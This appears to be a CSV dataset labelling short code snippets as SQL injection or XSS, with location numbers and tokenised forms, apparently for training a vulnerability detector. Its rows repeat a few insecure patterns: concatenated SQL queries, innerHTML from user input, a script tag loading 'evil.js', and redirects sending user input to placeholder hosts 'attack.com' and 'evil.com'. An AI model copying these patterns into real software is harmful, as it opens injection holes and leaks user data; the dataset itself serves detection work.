Code Snippet,Vulnerability Type,Location,Preprocessed Tokens
db.execute('SELECT * FROM employees WHERE id = ' + user_input),SQLi,2,"[""db.execute('SELECT"", '*', 'FROM', 'employees', 'WHERE', 'id', '=', ""'"", '+', 'user_input)']"
connection.query('SELECT * FROM users WHERE username = ' + input_string),SQLi,16,"[""connection.query('SELECT"", '*', 'FROM', 'users', 'WHERE', 'username', '=', ""'"", '+', 'input_string)']"
cursor.execute('SELECT * FROM users WHERE username = ' + user_input),SQLi,18,"[""cursor.execute('SELECT"", '*', 'FROM', 'users', 'WHERE', 'username', '=', ""'"", '+', 'user_input)']"
db.execute('SELECT * FROM employees WHERE id = ' + user_input),SQLi,15,"[""db.execute('SELECT"", '*', 'FROM', 'employees', 'WHERE', 'id', '=', ""'"", '+', 'user_input)']"
document.getElementById('input').innerHTML = user_input;,XSS,7,"[""document.getElementById('input').innerHTML"", '=', 'user_input;']"
query = 'SELECT * FROM customers WHERE email = ' + email_input,SQLi,17,"['query', '=', ""'SELECT"", '*', 'FROM', 'customers', 'WHERE', 'email', '=', ""'"", '+', 'email_input']"
"document.write('<script src=""evil.js""></script>');",XSS,9,"[""document.write('<script"", 'src=""evil.js""></script>\');']"
query = 'SELECT * FROM customers WHERE email = ' + email_input,SQLi,20,"['query', '=', ""'SELECT"", '*', 'FROM', 'customers', 'WHERE', 'email', '=', ""'"", '+', 'email_input']"
query = 'SELECT * FROM customers WHERE email = ' + email_input,SQLi,8,"['query', '=', ""'SELECT"", '*', 'FROM', 'customers', 'WHERE', 'email', '=', ""'"", '+', 'email_input']"
window.location.href = 'http://attack.com?user=' + user_input;,XSS,12,"['window.location.href', '=', ""'http://attack.com?user='"", '+', 'user_input;']"
query = 'SELECT * FROM customers WHERE email = ' + email_input,SQLi,11,"['query', '=', ""'SELECT"", '*', 'FROM', 'customers', 'WHERE', 'email', '=', ""'"", '+', 'email_input']"
db.execute('SELECT * FROM products WHERE product_id = ' + product_input),SQLi,8,"[""db.execute('SELECT"", '*', 'FROM', 'products', 'WHERE', 'product_id', '=', ""'"", '+', 'product_input)']"
document.getElementById('input').innerHTML = user_input;,XSS,15,"[""document.getElementById('input').innerHTML"", '=', 'user_input;']"
alert('Hello ' + user_input);,XSS,3,"[""alert('Hello"", ""'"", '+', 'user_input);']"
connection.query('SELECT * FROM users WHERE username = ' + input_string),SQLi,9,"[""connection.query('SELECT"", '*', 'FROM', 'users', 'WHERE', 'username', '=', ""'"", '+', 'input_string)']"
document.getElementById('input').innerHTML = user_input;,XSS,10,"[""document.getElementById('input').innerHTML"", '=', 'user_input;']"
db.execute('SELECT * FROM employees WHERE id = ' + user_input),SQLi,10,"[""db.execute('SELECT"", '*', 'FROM', 'employees', 'WHERE', 'id', '=', ""'"", '+', 'user_input)']"
"document.write('<script src=""evil.js""></script>');",XSS,7,"[""document.write('<script"", 'src=""evil.js""></script>\');']"
document.getElementById('input').innerHTML = user_input;,XSS,7,"[""document.getElementById('input').innerHTML"", '=', 'user_input;']"
db.execute('SELECT * FROM products WHERE product_id = ' + product_input),SQLi,14,"[""db.execute('SELECT"", '*', 'FROM', 'products', 'WHERE', 'product_id', '=', ""'"", '+', 'product_input)']"
window.location.href = 'http://attack.com?user=' + user_input;,XSS,14,"['window.location.href', '=', ""'http://attack.com?user='"", '+', 'user_input;']"
document.location = 'http://evil.com?username=' + user_input;,XSS,8,"['document.location', '=', ""'http://evil.com?username='"", '+', 'user_input;']"
"document.write('<script src=""evil.js""></script>');",XSS,4,"[""document.write('<script"", 'src=""evil.js""></script>\');']"
document.getElementById('input').innerHTML = user_input;,XSS,12,"[""document.getElementById('input').innerHTML"", '=', 'user_input;']"
db.execute('SELECT * FROM products WHERE product_id = ' + product_input),SQLi,17,"[""db.execute('SELECT"", '*', 'FROM', 'products', 'WHERE', 'product_id', '=', ""'"", '+', 'product_input)']"
document.location = 'http://evil.com?username=' + user_input;,XSS,7,"['document.location', '=', ""'http://evil.com?username='"", '+', 'user_input;']"
db.execute('SELECT * FROM products WHERE product_id = ' + product_input),SQLi,14,"[""db.execute('SELECT"", '*', 'FROM', 'products', 'WHERE', 'product_id', '=', ""'"", '+', 'product_input)']"
window.location.href = 'http://attack.com?user=' + user_input;,XSS,7,"['window.location.href', '=', ""'http://attack.com?user='"", '+', 'user_input;']"
connection.query('SELECT * FROM users WHERE username = ' + input_string),SQLi,6,"[""connection.query('SELECT"", '*', 'FROM', 'users', 'WHERE', 'username', '=', ""'"", '+', 'input_string)']"
db.execute('SELECT * FROM employees WHERE id = ' + user_input),SQLi,6,"[""db.execute('SELECT"", '*', 'FROM', 'employees', 'WHERE', 'id', '=', ""'"", '+', 'user_input)']"
"document.write('<script src=""evil.js""></script>');",XSS,18,"[""document.write('<script"", 'src=""evil.js""></script>\');']"
document.location = 'http://evil.com?username=' + user_input;,XSS,2,"['document.location', '=', ""'http://evil.com?username='"", '+', 'user_input;']"
cursor.execute('SELECT * FROM users WHERE username = ' + user_input),SQLi,16,"[""cursor.execute('SELECT"", '*', 'FROM', 'users', 'WHERE', 'username', '=', ""'"", '+', 'user_input)']"
"document.write('<script src=""evil.js""></script>');",XSS,16,"[""document.write('<script"", 'src=""evil.js""></script>\');']"
document.getElementById('input').innerHTML = user_input;,XSS,14,"[""document.getElementById('input').innerHTML"", '=', 'user_input;']"
db.execute('SELECT * FROM products WHERE product_id = ' + product_input),SQLi,8,"[""db.execute('SELECT"", '*', 'FROM', 'products', 'WHERE', 'product_id', '=', ""'"", '+', 'product_input)']"
window.location.href = 'http://attack.com?user=' + user_input;,XSS,11,"['window.location.href', '=', ""'http://attack.com?user='"", '+', 'user_input;']"
db.execute('SELECT * FROM products WHERE product_id = ' + product_input),SQLi,1,"[""db.execute('SELECT"", '*', 'FROM', 'products', 'WHERE', 'product_id', '=', ""'"", '+', 'product_input)']"
db.execute('SELECT * FROM employees WHERE id = ' + user_input),SQLi,1,"[""db.execute('SELECT"", '*', 'FROM', 'employees', 'WHERE', 'id', '=', ""'"", '+', 'user_input)']"
document.getElementById('input').innerHTML = user_input;,XSS,6,"[""document.getElementById('input').innerHTML"", '=', 'user_input;']"
document.getElementById('input').innerHTML = user_input;,XSS,19,"[""document.getElementById('input').innerHTML"", '=', 'user_input;']"
"document.write('<script src=""evil.js""></script>');",XSS,15,"[""document.write('<script"", 'src=""evil.js""></script>\');']"
cursor.execute('SELECT * FROM users WHERE username = ' + user_input),SQLi,8,"[""cursor.execute('SELECT"", '*', 'FROM', 'users', 'WHERE', 'username', '=', ""'"", '+', 'user_input)']"
db.execute('SELECT * FROM products WHERE product_id = ' + product_input),SQLi,12,"[""db.execute('SELECT"", '*', 'FROM', 'products', 'WHERE', 'product_id', '=', ""'"", '+', 'product_input)']"
db.execute('SELECT * FROM products WHERE product_id = ' + product_input),SQLi,5,"[""db.execute('SELECT"", '*', 'FROM', 'products', 'WHERE', 'product_id', '=', ""'"", '+', 'product_input)']"
cursor.execute('SELECT * FROM users WHERE username = ' + user_input),SQLi,11,"[""cursor.execute('SELECT"", '*', 'FROM', 'users', 'WHERE', 'username', '=', ""'"", '+', 'user_input)']"
connection.query('SELECT * FROM users WHERE username = ' + input_string),SQLi,7,"[""connection.query('SELECT"", '*', 'FROM', 'users', 'WHERE', 'username', '=', ""'"", '+', 'input_string)']"
db.execute('SELECT * FROM employees WHERE id = ' + user_input),SQLi,19,"[""db.execute('SELECT"", '*', 'FROM', 'employees', 'WHERE', 'id', '=', ""'"", '+', 'user_input)']"
query = 'SELECT * FROM customers WHERE email = ' + email_input,SQLi,12,"['query', '=', ""'SELECT"", '*', 'FROM', 'customers', 'WHERE', 'email', '=', ""'"", '+', 'email_input']"
db.execute('SELECT * FROM products WHERE product_id = ' + product_input),SQLi,3,"[""db.execute('SELECT"", '*', 'FROM', 'products', 'WHERE', 'product_id', '=', ""'"", '+', 'product_input)']"
document.getElementById('input').innerHTML = user_input;,XSS,15,"[""document.getElementById('input').innerHTML"", '=', 'user_input;']"
db.execute('SELECT * FROM employees WHERE id = ' + user_input),SQLi,8,"[""db.execute('SELECT"", '*', 'FROM', 'employees', 'WHERE', 'id', '=', ""'"", '+', 'user_input)']"
document.location = 'http://evil.com?username=' + user_input;,XSS,8,"['document.location', '=', ""'http://evil.com?username='"", '+', 'user_input;']"
connection.query('SELECT * FROM users WHERE username = ' + input_string),SQLi,17,"[""connection.query('SELECT"", '*', 'FROM', 'users', 'WHERE', 'username', '=', ""'"", '+', 'input_string)']"
connection.query('SELECT * FROM users WHERE username = ' + input_string),SQLi,8,"[""connection.query('SELECT"", '*', 'FROM', 'users', 'WHERE', 'username', '=', ""'"", '+', 'input_string)']"
db.execute('SELECT * FROM employees WHERE id = ' + user_input),SQLi,10,"[""db.execute('SELECT"", '*', 'FROM', 'employees', 'WHERE', 'id', '=', ""'"", '+', 'user_input)']"
window.location.href = 'http://attack.com?user=' + user_input;,XSS,15,"['window.location.href', '=', ""'http://attack.com?user='"", '+', 'user_input;']"
"document.write('<script src=""evil.js""></script>');",XSS,2,"[""document.write('<script"", 'src=""evil.js""></script>\');']"
connection.query('SELECT * FROM users WHERE username = ' + input_string),SQLi,5,"[""connection.query('SELECT"", '*', 'FROM', 'users', 'WHERE', 'username', '=', ""'"", '+', 'input_string)']"
db.execute('SELECT * FROM products WHERE product_id = ' + product_input),SQLi,2,"[""db.execute('SELECT"", '*', 'FROM', 'products', 'WHERE', 'product_id', '=', ""'"", '+', 'product_input)']"
connection.query('SELECT * FROM users WHERE username = ' + input_string),SQLi,19,"[""connection.query('SELECT"", '*', 'FROM', 'users', 'WHERE', 'username', '=', ""'"", '+', 'input_string)']"
cursor.execute('SELECT * FROM users WHERE username = ' + user_input),SQLi,3,"[""cursor.execute('SELECT"", '*', 'FROM', 'users', 'WHERE', 'username', '=', ""'"", '+', 'user_input)']"
connection.query('SELECT * FROM users WHERE username = ' + input_string),SQLi,12,"[""connection.query('SELECT"", '*', 'FROM', 'users', 'WHERE', 'username', '=', ""'"", '+', 'input_string)']"
document.location = 'http://evil.com?username=' + user_input;,XSS,6,"['document.location', '=', ""'http://evil.com?username='"", '+', 'user_input;']"
document.getElementById('input').innerHTML = user_input;,XSS,17,"[""document.getElementById('input').innerHTML"", '=', 'user_input;']"
window.location.href = 'http://attack.com?user=' + user_input;,XSS,17,"['window.location.href', '=', ""'http://attack.com?user='"", '+', 'user_input;']"
document.getElementById('input').innerHTML = user_input;,XSS,4,"[""document.getElementById('input').innerHTML"", '=', 'user_input;']"
cursor.execute('SELECT * FROM users WHERE username = ' + user_input),SQLi,2,"[""cursor.execute('SELECT"", '*', 'FROM', 'users', 'WHERE', 'username', '=', ""'"", '+', 'user_input)']"
query = 'SELECT * FROM customers WHERE email = ' + email_input,SQLi,14,"['query', '=', ""'SELECT"", '*', 'FROM', 'customers', 'WHERE', 'email', '=', ""'"", '+', 'email_input']"
db.execute('SELECT * FROM employees WHERE id = ' + user_input),SQLi,15,"[""db.execute('SELECT"", '*', 'FROM', 'employees', 'WHERE', 'id', '=', ""'"", '+', 'user_input)']"
document.location = 'http://evil.com?username=' + user_input;,XSS,7,"['document.location', '=', ""'http://evil.com?username='"", '+', 'user_input;']"
"document.write('<script src=""evil.js""></script>');",XSS,10,"[""document.write('<script"", 'src=""evil.js""></script>\');']"
query = 'SELECT * FROM customers WHERE email = ' + email_input,SQLi,14,"['query', '=', ""'SELECT"", '*', 'FROM', 'customers', 'WHERE', 'email', '=', ""'"", '+', 'email_input']"
alert('Hello ' + user_input);,XSS,16,"[""alert('Hello"", ""'"", '+', 'user_input);']"
document.getElementById('input').innerHTML = user_input;,XSS,14,"[""document.getElementById('input').innerHTML"", '=', 'user_input;']"
window.location.href = 'http://attack.com?user=' + user_input;,XSS,8,"['window.location.href', '=', ""'http://attack.com?user='"", '+', 'user_input;']"
cursor.execute('SELECT * FROM users WHERE username = ' + user_input),SQLi,3,"[""cursor.execute('SELECT"", '*', 'FROM', 'users', 'WHERE', 'username', '=', ""'"", '+', 'user_input)']"
db.execute('SELECT * FROM employees WHERE id = ' + user_input),SQLi,8,"[""db.execute('SELECT"", '*', 'FROM', 'employees', 'WHERE', 'id', '=', ""'"", '+', 'user_input)']"
cursor.execute('SELECT * FROM users WHERE username = ' + user_input),SQLi,12,"[""cursor.execute('SELECT"", '*', 'FROM', 'users', 'WHERE', 'username', '=', ""'"", '+', 'user_input)']"
query = 'SELECT * FROM customers WHERE email = ' + email_input,SQLi,13,"['query', '=', ""'SELECT"", '*', 'FROM', 'customers', 'WHERE', 'email', '=', ""'"", '+', 'email_input']"
document.getElementById('input').innerHTML = user_input;,XSS,8,"[""document.getElementById('input').innerHTML"", '=', 'user_input;']"
window.location.href = 'http://attack.com?user=' + user_input;,XSS,13,"['window.location.href', '=', ""'http://attack.com?user='"", '+', 'user_input;']"
alert('Hello ' + user_input);,XSS,11,"[""alert('Hello"", ""'"", '+', 'user_input);']"
